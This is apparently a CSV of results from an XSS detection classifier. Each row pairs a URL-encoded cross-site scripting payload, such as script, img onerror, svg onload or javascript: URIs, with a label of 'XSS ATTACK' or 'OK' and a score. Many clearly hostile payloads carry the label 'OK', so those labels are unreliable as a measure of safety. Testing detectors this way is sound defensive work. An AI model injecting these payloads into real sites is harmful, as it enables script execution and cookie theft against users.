sentence,result,threshold
%22%3E%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3B%20url%3Ddata%3Atext/html%2C%253C%2573%2563%2572%2569%2570%2574%253E%2561%256C%2565%2572%2574%2528%2531%2529%253C%252F%2573%2563%2572%2569%2570%2574%253E%22%3E,OK,0.00808861852
%26%27%22%3E%25u003c%25u0073%25u0063%25u0072%25u0069%25u0070%25u0074%25u003e%25u0061%25u006c%25u0065%25u0072%25u0074%25u0028%25u002f%25u0078%25u0073%25u0073%25u002f%25u0029%25u003c%25u002f%25u0073%25u0063%25u0072%25u0069%25u0070%25u0074%25u003e,OK,0.000727176666
%27%3E%3CIMG%20LOWSRC%3D%22javascript%3Aalert%28%27X%27%29%22%3E,XSS ATTACK,0.989079416
%27%3E%3Cbody%20onbeforeunload%20body%20onbeforeunload%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onbeforeunload%3E,OK,0.00370928645
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3B%3C/script%3E,OK,0.262755871
%27%3E%3Ca%20href%3D%22%5CxE2%5Cx80%5CxAFjavascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0139488876
%3Cstyle%3E%3Cimg%20src%3D%22%3C/style%3E%3Cimg%20src%3Dx%20onerror%3Dprompt%281%29//%22%3E,OK,0.136378706
%3Ca%20href%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3Cevent-source%20src%3D%22data%3Aapplication/x-dom-event-stream%2CEvent%3Aclick%250Adata%3AX%250A%250A%22%3E,OK,0.00304758549
%3Cinput%20x%3Djavascript%3A%20autofocus%20onfocus%3Dalert%281%29%3E%3Csvg%20id%3D1%20onload%3Dalert%281%29%3E%3C/svg%3E,OK,0.00370296836
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
0%5C%2522%29%29%7Dcatch%28e%29%7Balert%281%29%7D//,XSS ATTACK,0.99864006
%27%3E%3CIMG%20SRC%3Djavascript%3Ajavascript%3Aalert%281%29%3E,XSS ATTACK,0.918202758
%3C/svg%3E%27%27%3Csvg%3E%3Cscript%20%27AQuickBrownFoxJumpsOverTheLazyDog%27%3Ealert%26%23x28%3B1%26%23x29%3B,OK,0.278049111
%22%3E%3Cimg%20src%20%3Fitworksonchrome%3F%5C/onerror%20%3D%20alert%281%29,OK,0.0047211647
%27%3E%3Cimage%20name%3Dbody%3E%3Cimg%20src%3Dx%3E%3Csvg%20onload%3Dalert%281%29%3B%20autofocus%3E%2C%20%3Ckeygen%20onfocus%3Dalert%281%29%3B%20autofocus%3E,OK,0.391094029
%3Cdiv%20style%3Dcontent%3Aurl%28%25%28svg%29s%29%3E%3C/div%3E,OK,0.0218285918
%3Cimg/%3Fonerror%3Dalert%281%29%20src%3Da%3E,OK,0.0493798852
%27%3E%3C%21--%3Cimg%20src%3D%22--%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%22%3E,XSS ATTACK,0.999759614
%3CX%20STYLE%3D%22X%3Aexpression%28alert%28%27X%27%29%29%22%3E,XSS ATTACK,0.874789953
%22%3E%3Cisindex%20action%3D%22javas%26Tab%3Bcript%3Aalert%281%29%22%20type%3Dimage%3E,XSS ATTACK,0.569845319
%3Ca%20onmouseover%3D%28alert%281%29%29%3EX%3C/a%3E,XSS ATTACK,0.82577467
%3C/ScrIpt%3E%3Cscript%3Ea%3D%20%7Bget%5Balert%601%60%5D%28%29%7B%7D%7D%3C/script%3E,OK,0.00899940729
%27%3E%3Cscript%3Eeval%28String.fromCharCode%2875%2C67%2C70%29%29%3B%3C/script%3E,OK,0.300307184
%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.474990964
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%3Cscript%3Edocument.write%28toStaticHTML%28%22%3Cstyle%3Ediv%7Bfont-family%3Argb%28%270%2C0%2C0%29%27%27%27%7Dfoo%27%29%3Bcolor%3Dexpression%28alert%281%29%29%3B%7B%7D%3C/style%3E%3Cdiv%3EPOC%3C/div%3E%22%29%29%3C/script%3E,OK,0.00346833467
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%22%3E%3C/font%3E/%3Csvg%3E%3Cstyle%3E%7Bsrc%26%23x3A%3B%27%3Cstyle/onload%3Dthis.onload%3Dconfirm%281%29%3E%27%3C/font%3E/%3C/style%3E,OK,0.0570246279
%3Cimg%20src%3D%22x%3Aalert%22%20onerror%3D%22eval%28src%252b%27%281%29%27%29%22%3E,OK,0.00243803859
%3Cimg%20onerror%3Da%26%230108%3Bert%281%29%20src%3Da%3E,OK,0.0367839038
%27%3E%3Cscript%20src%3D%22javascript%3Aalert%281%29%22%3E%3C/script%3E,XSS ATTACK,0.617463946
%27%3E%3Cimg%5Ba%5D%5Bb%5Dsrc%3Dx%5Bd%5Donerror%5Bc%5D%3D%5Be%5D%22alert%281%29%22%3E,OK,0.00367951393
%3C/ScrIpt%3E%3Cscript%3E/%2A%40cc_on%20alert%281%29%20%40%2A/%3C/script%3E,OK,0.00792735815
%22%3E%3CSCRIPT%3E%20alert%28%5C%221%5C%22%29%3C/SCRIPT%3E,XSS ATTACK,0.994870484
%27%3E%3Cimg%20src%3Dxxx%3Axxx%20title%3D1/onerror%3Dalert%281%29%3E,OK,0.0145279169
http%3A//%2522%2520onerror%3D%2522alert%25281%2529%3B//,XSS ATTACK,0.996919334
%22%3E%3Cxml%20onreadystatechange%3Dalert%281%29%3E,OK,0.00564309955
%27%3E%3Csvg%0Conload%3Dalert%281%29%3E,OK,0.0141067803
%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,XSS ATTACK,0.474990964
%5C%22%3E%3Cbody%20onload%3D%5C%221%5C%22%3E,XSS ATTACK,0.936751068
%3Csvg%20onLoad%20svg%20onLoad%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/svg%20onLoad%3E,OK,0.00265601277
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
%27%3E%3CIFRAME%20SRC%3D%22javascript%3Aalert%28%27X%27%29%3B%22%3E%3C/IFRAME%3E,XSS ATTACK,0.997954965
%22%3E%3Cimg%20onerror%3Da%26%230108%3Bert%281%29%20src%3Da%3E,OK,0.00433173776
%27%3E%3Csvg%20onload%3Dprompt%281%29%3B%3E,OK,0.0158494413
%27%3E%3Cimg%5Cx47src%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.0173839629
%3Cinput%20oninput%3Dalert%281%29%3E,OK,0.119032413
%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx82javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0487144
%3Ca%20href%3D%22javascript%23alert%281%29%3B%22%3E,OK,0.0348948538
%3Cscript%5Cx0Ctype%3D%22text/javascript%22%3Ejavascript%3Aalert%281%29%3B%3C/script%3E,XSS ATTACK,0.670388639
%22%3E%3Cvideo%20onerror%3D%22alert%281%29%22%3E%3Csource%3E%3C/source%3E%3C/video%3E%3C/div%3E,OK,0.00973105431
%3Cscript%3Ealert%601%60%3C/script%3E,XSS ATTACK,0.977972627
%3CSCRIPT%3Ea%3D/X/,OK,0.399285465
%22%3E%3Cimg%20src%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmp.bmp%22%20onerror%3Dalert%281%29%3E,OK,0.00336113572
%22%3E%3CIMG%20SRC%3D%22javascript%3Aalert%28%27X%27%29%22,XSS ATTACK,0.947467566
%27%3E%3Ca%20href%3D%22%5CxE2%5Cx80%5CxA9javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0143179297
%22%3E%3CScRIPt%3Eprompt%281%29%3C/ScRIPt%3E,XSS ATTACK,0.891551256
ABC%3Cdiv%20style%3D%22x%3A%5CxE3%5Cx80%5Cx80expression%28javascript%3Aalert%281%29%22%3EDEF,OK,0.0106339753
%27%3E%3Cmeta%20charset%3DShift_JIS%3E%3Cscript%3Ex%3D%22%3F%5C%22%3Balert%281%29//%22%3C/script%3E,OK,0.0100024939
%27%3E%3Cevent-source%20src%3Djavascript%3Aalert%281%29%3E,XSS ATTACK,0.987362742
alert%28/XSS/%29%3B,OK,0.201339334
%27%3E%3Ca%20href%3D%22javas%5Cx00cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0936430395
%22%3E%3Cscript%3Ealert%25281%2529%3C/script%3E,XSS ATTACK,0.469213426
%27%3E%3Ca%20href%3D%22%5Cx12javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0323115289
%3C%250ascript%3Ealert%281%29%3B%3C/script%3E,XSS ATTACK,0.505032659
%27%3E%3Cscript%3E%3Falert%281%29%3F.replace%28/.%2B/%2Ceval%29%3C/script%3E,OK,0.0228203237
%27%3E%3CBGSOUND%20SRC%3D%22javascript%3Ajavascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.99323523
%3Cbody%20onfocus%3D%22location%3D%27javascrpt%3Aalert%281%29%20%3E123,OK,0.0641626716
%22%3E%3Ca%20href%3D%22%5CxC2%5CxA0javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0150652528
%27%3E%3C%3Fxml-stylesheet%20type%3D%22text/css%22%3F%3E%3Croot%20style%3D%22x%3Aexpression%28alert%281%29%29%22/%3E,OK,0.0567426383
%5C%22%3E%3Cscript%3Ealert%28/X/%29%3Cscript%3E,XSS ATTACK,0.968638062
%27%3E%3Cimg%20src%3Dx%20onerror%3D%5Cx09%22javascript%3Aalert%281%29%22%3E,OK,0.00242578983
%22%3E%3Ca%20href%3D%22javascript%5Cx00%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0985096395
%255C%255C%27%252Balert%281%29%253B%252F%252F,XSS ATTACK,0.994068801
%22%3E%3Cscript%3Eif%28%22xx%22%20%3D%3D%20%22xx%22%29%20%7B%20alert%281%29%3B%7D%3C/script%3E,XSS ATTACK,0.799060285
%27%3B%21--%22%3CXSS%3E%3Cscript%3Ealert%281%29%3B%3C/script%3E,XSS ATTACK,0.999095917
%27%3E%3Capplet%20onreadystatechange%20applet%20onreadystatechange%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/applet%20onreadystatechange%3E,OK,0.027669847
%2A%20%7B-o-link%3A%27javascript%3Aalert%281%29%27%3B-o-link-source%3A%20current%3B%7D,OK,0.164087594
%27%3E%3Cscript%20type%3D%22text/javascript%22%3Ewindow.open%28%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%22%2C%22_self%22%29%3B%3C/script%3E,OK,0.223277509
%27%3E%3CSTYLE%3Ea%7Bbackground%3Aurl%28%27s1%27%20%27s2%29%7D%40import%20javascript%3Ajavascript%3Aalert%281%29%3B%27%29%3B%7D%3C/STYLE%3E,OK,0.201282889
%3Ca%20href%3D%22javas%5Cx00cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0065767467
%22%3E%3CX%20STYLE%3D%22behavior%3A%20url%28%25%28htc%29s%29%3B%22%3E,XSS ATTACK,0.947900653
%22%3E%3Cimg/%3Fonerror%3Dalert%281%29%20src%3Da%3E,OK,0.0364093184
%27%3E%3Cscript%20src%3D%22data%3A%5CxCB%5Cx8F%2Cjavascript%3Aalert%281%29%22%3E%3C/script%3E,OK,0.361828595
%3C/ScrIpt%3E%3Cscript%3Eif%28%22x%5C%22.length%3D%3D2%29%20%7B%20alert%281%29%3B%7D%3C/script%3E,OK,0.0133352578
%3Ccomment%3E%3Cimg%20src%3D%22%3C/comment%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%29//%22%3E,XSS ATTACK,0.527121425
%22%3E%3Ctable%20background%3D%22javascript%3Aalert%281%29%22%3E%3C/table%3E,OK,0.0269792378
%3C/script%3E%3Cscript%3Ealert%28X,XSS ATTACK,0.822093487
%22%3E%3Ccommand%20onmouseover%3D%22%5Cx6A%5Cx61%5Cx76%5Cx61%5Cx53%5Cx43%5Cx52%5Cx49%5Cx50%5Cx54%5Cx26%5Cx63%5Cx6F%5Cx6C%5Cx6F%5Cx6E%5Cx3B%5Cx63%5Cx6F%5Cx6E%5Cx66%5Cx69%5Cx72%5Cx6D%5Cx26%5Cx6C%5Cx70%5Cx61%5Cx72%5Cx3B%5Cx31%5Cx26%5Cx72%5Cx70%5Cx61%5Cx72%5Cx3B%22%3ESave%3C/command%3E,OK,0.000138312578
%3C/ScrIpt%3E%3Cscript%3E%20document.cookie%3D%27X%27%3B%20if%28document.cookie%20%21%3D%3D%20%27X%27%29%20%7B%20alert%281%2Cdocument.cookie%29%3B%20%7D%20%3C/script%3E,OK,0.0029040277
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.038064003
accesskey%3DX%20onclick%3Dalert%281%29,XSS ATTACK,0.992583513
javascript%3Aalert%281%29//--%3E%3C/script%3E%3C/textarea%3E%3C/style%3E%3C/title%3E%3Ca%22//%27%20onclick%3Dalert%281%29//%3E%2A/alert%281%29/%2A,XSS ATTACK,0.963846922
document.location%3D%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.html%27,XSS ATTACK,0.999718
%22%3E%3Cscript%20language%3Dvbs%3EexecScript%28%3Falert%281%29%3F%29%3C/script%3E,OK,0.073158294
%3C%3Cscript%3Ealert%281%29%3B%3C/script%3E,XSS ATTACK,0.937859535
%27%60%22%3E%3C%5Cx3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,XSS ATTACK,0.99503088
%3Cx%20style%3Dbehavior%3Aurl%28%23default%23time2%29%20onbegin%3Dalert%281%29%3E,OK,0.00234267116
%22%3E%3Cscript%3Ea%3D%20%7Bget%5Balert%601%60%5D%28%29%7B%7D%7D%3C/script%3E,OK,0.043238312
%3C/ScrIpt%3E%3Cscript%3E%20document.cookie%3D%27X%27%3B%20if%28document.cookie%20%21%3D%3D%20%27X%27%29%20%7B%20alert%281%2Cdocument.cookie%29%3B%20%7D%20%3C/script%3E,OK,0.0029040277
perl%20-e%20%27print%20%22%3CIMG%20SRC%3Djava%5C0script%3Aalert%281%29%3E%22%3B%27%3E%20out,OK,0.00226801634
%22%3E%3Cscript%3E%20var%20x%20%3D%20%22X%5C%22%3B%20alert%281%29%3B%20%3C/script%3E,XSS ATTACK,0.425188094
%27%3E%3C%3CSCRIPT%3Ealert%28%22X%22%29%3B//%3C%3C/SCRIPT%3E,XSS ATTACK,0.979895949
%3Cp/onmouseover%3Djavascript%3Aalert%281%29%3B%20%3EX%3C/p%3E,XSS ATTACK,0.998762965
%27%3E%3Ca%20href%3D%22javas%5Cx01cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0933071673
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3B%3C/script%3E,OK,0.262755871
%3Cimg%20onerror%3Da%26%23x06c%3Bert%281%29%20src%3Da%3E,OK,0.157842517
%27%3E%3Csvg%3E%3Cg/onload%3Dalert%281%29//,OK,0.0408805907
%3C/ScrIpt%3E%3CSCRIPT%3Ealert%281%29%3B%3C/SCRIPT%3E,OK,0.0839524269
%27%3E%3Cx%20style%3D%22background%3Aurl%28%27x%5Ba%5D%3Bcolor%3Ared%3B/%2A%27%29%22%3EXXX%3C/x%3E,OK,0.00244122744
%27%3E%3CIMG%20SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%281%29%3B%22%3E,XSS ATTACK,0.990206242
%22%3E%3Cobject%20type%3D%22text/x-scriptlet%22%20data%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/object%3E,XSS ATTACK,0.583973408
%22%3E%3CSCRIPT%20a%3D%22%3E%22%20%27%27%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E,OK,0.0974355638
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.038064003
%22%3E%3Cimg%20src%3Dxx%3Axx%20alt%3D%60/onerror%3Dalert%281%29//%60%3E,OK,0.0117917657
%27%3E%3Cbutton/onclick%3Dalert%281%29%20%3EX%3C/button%3E,XSS ATTACK,0.925420165
%3C/ScrIpt%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.204554617
%22%3E%3Cmarquee/onstart%3Dalert%281%29%3E,XSS ATTACK,0.961195
%27%3E%3CSTYLE%20type%3D%22text/css%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Ajavascript%3Aalert%281%29%22%29%7D%3C/STYLE%3E,XSS ATTACK,0.98527509
%22%3E%3C%21--%3Cimg%20src%3D%22--%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29//%22%3E,XSS ATTACK,0.999753296
%22%3E%3Cimg%20src%3D%22x%3Agif%22%20onerror%3D%22eval%28%27al%27%252b%27lert%281%29%27%29%22%3E,OK,0.00138768554
%22%3E%3Cimg%20src%5Cx00%3Dx%20onerror%3D%22javascript%3Aalert%281%29%22%3E,OK,0.00266358256
%27%3E%3Cdiv%20style%3D%22color%3Argb%28%27%27%26%230%3Bx%3Aexpression%28alert%281%29%29%22%3E%3C/div%3E,OK,0.00222206116
%3Cimg%20src%3Dx%20onerror%3D%5Cx32%22javascript%3Aalert%281%29%22%3E,OK,0.00458201766
%3E%3Cscript%3EX%3C%5C/script%3E,XSS ATTACK,0.937675118
%22%3E%3CSTYLE%20type%3D%22text/css%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%281%29%22%29%7D%3C/STYLE%3E,XSS ATTACK,0.997981846
%3CDIV%20STYLE%3D%22background-image%3A%20url%28javascript%3Ajavascript%3Aalert%281%29%29%22%3E,XSS ATTACK,0.422680527
%3C/ScrIpt%3E%3Cscript%3E%20chr%3DString.fromCharCode%281%29%3B%20result%3D%27%27%3B%20try%7B%20result%3DencodeURI%28chr%29%3B%20%7Dcatch%28e%29%7B%7D%20if%28%21/%25/.test%28result%29%26%26result.length%29%20%7B%20ids.push%281%29%3B%20%7D%20%3C/script%3E,OK,0.000999122858
%3Ciframe%20%2500%20src%3D%22%26Tab%3Bjavascript%3Aprompt%281%29%26Tab%3B%22%2500%3E,XSS ATTACK,0.988768816
%27%3E%3Cdiv%20style%3D%22font-family%3Afoo%7Dcolor%3Dred%3B%22%3EXXX%3C/div%3E,OK,0.0028950572
%3Cimg/src%3D%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/jpg.jpg%27%20onmouseover%3D%26Tab%3Bprompt%281%29,OK,0.0461314619
%22%3E%3Cimg%5B%2509%5Donerror%3Dalert%281%29%20src%3Da%3E,OK,0.362513125
%22%3E%3Chtml%20onMouseDown%20html%20onMouseDown%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/html%20onMouseDown%3E,OK,0.00261193514
%27%3E%3CMETA%20HTTP-EQUIV%3D%22refresh%22%20CONTENT%3D%220%3B%20URL%3Dhttp%3A//%3BURL%3Djavascript%3Ajavascript%3Aalert%281%29%3B%22%3E,OK,0.0305325687
%22%3E%3Cbody%20onpagehide%20body%20onpagehide%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/body%20onpagehide%3E,OK,0.0259574056
%22%3E%3Ca%20href%3D%22javas%5Cx09cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0885834694
%3C/ScrIpt%3E%3Cscript%3E%3Falert%281%29%3F.replace%28/.%2B/%2Ceval%29%3C/script%3E,OK,0.00524845719
%3Cp%20style%3D%22font-family%3A%27%5C22%5C3bx%3Aexpression%28alert%281%29%29/%2A%27%22%3E,OK,0.00339326262
%3Cimg%20src%3Da%20onerror%3Dalert%281%29,OK,0.032648623
%2522%2520onmouseover%3Djavascript%3Aalert%281%29%2520%2522,XSS ATTACK,0.92875
%27%3E%3CIMG%20SRC%3Djavascript%3Aalert%28%22X%22%29%3E,XSS ATTACK,0.927945375
%3C/ScrIpt%3E%3Cscript%3Ealert%281%29%3C/script%3E,OK,0.342933565
%22%3E%3Cinput%20onfocus%3Djavascript%3Aalert%281%29%20autofocus%3E,OK,0.228966594
eval%28%27alert%281%29%27%29,OK,0.116824508
%3C/ScrIpt%3E%3Cscript%3Ealert%28String.fromCharCode%2875%2C67%2C70%29%29%3C/script%3E,OK,0.0118615329
%22%3E%3Cimg%20src%3Dx%20onerror%3Djavascript%3Aalert%28%26%23039%3B1%26%23039%3B%29%3E,OK,0.00456407666
%3Cimg%20src%3D%27http%3A//127.0.0.1%3A3555/xss_serve_payloads/xxxgif.gif%27%20onerror%3D%27document.scripts%280%29.src%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%22%27%3E,OK,0.18538022
%3C/ScrIpt%3E%3Cscript%3Ejavascript%3Aalert%281%29%3C/script%3E,OK,0.038064003
%22%60%27%3E%3Cscript%3E%5CxE2%5Cx80%5Cx8Ajavascript%3Aalert%281%29%3C/script%3E,XSS ATTACK,0.423296601
%27%3E%3Cmeta%20http-equiv%3Drefresh%20content%3D%22javascript%3Aalert%28%271%27%29%22%3E,OK,0.00704276562
%27%3E%3Cscript%3Ealert%281%29/X/%27%3C/script%3E,XSS ATTACK,0.58043015
%22%3E%3Ciframe%3C%3Fphp%20echo%20chr%2811%29%3F%3E%20onload%3Dalert%281%29%3E%3C/iframe%3E,XSS ATTACK,0.679387033
javascript%3A%5Cu0070rompt%26%23x28%3B1%26%23x29%3B,XSS ATTACK,0.997193
%3Cimg%20src%3D%22javascript%3Aalert%281%29%22%3E,OK,0.0208960474
%22%3E%3Ciframe/onreadystatechange%3D%5Cu0061%5Cu006C%5Cu0065%5Cu0072%5Cu0074%28%27%5Cu0061%27%29%20worksinIE%3E,XSS ATTACK,0.625049174
%27%3E%3CSCRIPT%20onreadystatechange%3Djavascript%3Ajavascript%3Aalert%281%29%3B%3E%3C/SCRIPT%3E,XSS ATTACK,0.878393054
%27%3E%3Cembed%20code%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.swf%22%20allowscriptaccess%3Dalways%3E,XSS ATTACK,0.824919701
%22%3E%3Cp%20style%3D%22font-family%3A%27%5C22%5C3bx%3Aexpression%28alert%281%29%29/%2A%27%22%3E,OK,0.0074865222
%27%3E%3Cstyle%3E%3C/style%5Cx0D%3Cimg%20src%3D%22about%3Ablank%22%20onerror%3Djavascript%3Aalert%281%29//%3E%3C/style%3E,OK,0.00637638569
%27%3E%3CA%20CLASS%3DX%3E%3C/A%3E,XSS ATTACK,0.913857102
%3Cimg%20language%3D%3FJScript.Encode%3F%20onerror%3D%3F%23%40%7E%5ECAAAAA%3D%3DC%5E%2B.D%608%23mgIAAA%3D%3D%5E%23%7E%40%3F%20src%3Da%3E,OK,0.031676203
%22%3E%3Cvmlframe%20xmlns%3Durn%3Aschemas-microsoft-com%3Avml%20style%3Dbehavior%3Aurl%28%23default%23vml%29%3Bposition%3Aabsolute%3Bwidth%3A100%25%3Bheight%3A100%25%20src%3D%25%28vml%29s%23X%3E%3C/vmlframe%3E,OK,0.000689893961
%3Ca%20href%3D%22%5CxE2%5Cx80%5Cx86javascript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.0487280488
%22%3E%3Cobject%20data%3Djavascript%26colon%3B%5Cu0061%26%23x6C%3B%26%23101%2572t%281%29%3E,OK,0.364445984
%26lt%3B%3Fxml%3Anamespace%20prefix%3D%22t%22%20ns%3D%22urn%3Aschemas-microsoft-com%3Atime%22%26gt%3B,OK,0.000454157591
%26lt%3BIMG%20STYLE%3D%22X%3Aexpr/%2AX%2A/ession%28alert%281%29%29%22%26gt%3B,OK,0.0314416289
%22%3E%3Ca%20href%3D%22javas%5Cx06cript%3Ajavascript%3Aalert%281%29%22%20id%3D%22fuzzelement1%22%3Etest%3C/a%3E,OK,0.089397192
%27%3E%3Cimg/src%3Dx%20alt%3Dconfirm%281%29%20onerror%3Deval%28alt%29%3E,OK,0.210011929
%22%3E%3Cimg/src%3Dx%20alt%3Dconfirm%281%29%20onerror%3Deval%28alt%29%3E,OK,0.208090842
%22%3E%3Clink%20rel%3Dstylesheet%20href%3Ddata%3A%2C%2A%257bx%3Aexpression%28alert%281%29%29%257d,OK,0.00319811702
%27%3E%3Cform%3E%3Cisindex%20formaction%3D%22javascript%26colon%3Bconfirm%281%29%22,OK,0.00741058588
%3C/ScrIpt%3E%3CScRIPt%3Eprompt%281%29%3C/ScRIPt%3E,OK,0.311473221
%22%3E%3Cscript%3Eprompt%281%29%3C/script%3E,OK,0.294095278
%3C/ScrIpt%3E%3CSCRIPT%3Edocument.write%28%22%3CSCRI%22%29%3B%3C/SCRIPT%3EPT%20SRC%3D%22http%3A//127.0.0.1%3A3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E,OK,0.00540736318
%22%3E%3Cvideo%20poster%3Djavascript%3Aalert%281%29//%3E%3C/video%3E,OK,0.158456087
%27%3E%3Ciframe%3C%3Fphp%20echo%20chr%2812%29%3F%3E%20onload%3Dalert%281%29%3E%3C/iframe%3E,XSS ATTACK,0.684500635
%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3B%20url%3Ddata%3Atext/html%3Bblabla%2C%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B%26%2340%3B%26%2349%3B%26%2341%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%22%3E,OK,0.00210109353
%22%3E%3Cdiv%20style%3Dwidth%3A1px%3Bfilter%3Aglow%20onfilterchange%3Dalert%281%29%3Ex,OK,0.00200635195
%3Cimg%20src%3D%22%22%20onload%3Dalert%281%29%3E,OK,0.0353169441
%22%3E%3Cinput%20pattern%3D%5E%28%28a%2B.%29a%29%2B%24%20value%3Daaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%21%3E,OK,0.00460085273
%3C/ScrIpt%3E%3Cscript%3Ealert%28alert%281%29%29%3C/script%3E,OK,0.113103122
%3Cx%3Atemplate%20xmlns%3Ax%3D%22http%3A//www.wapforum.org/2001/wml%22%20%20x%3Aontimer%3D%22%24%28x%3Aunesc%29j%24%28y%3Aescape%29a%24%28z%3Anoecs%29v%24%28x%29a%24%28y%29s%24%28z%29cript%24x%3Aalert%281%29%22%3E%3Cx%3Atimer%20value%3D%221%22/%3E%3C/x%3Atemplate%3E,OK,0.00190240145
%3Cimg%20src%3Dfoo.png%20onerror%3D%2561%256C%2565%2572%2574%2528%252F%254B%2543%2546%252F%2529/%3E,OK,0.00716269
%27%3E%3C/script%3E%3Cscript%3E/%2Avar%20a%3D%22/%2A%22%22%27/%2A%2A/%3Balert%281%29%3B//%3C/script%3E,OK,0.208269268
%3Cframeset%20onScroll%20frameset%20onScroll%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/frameset%20onScroll%3E,OK,0.0102167726
%22%3E%3Cobject%20onError%20object%20onError%3D%22javascript%3Ajavascript%3Aalert%281%29%22%3E%3C/object%20onError%3E,OK,0.174520433
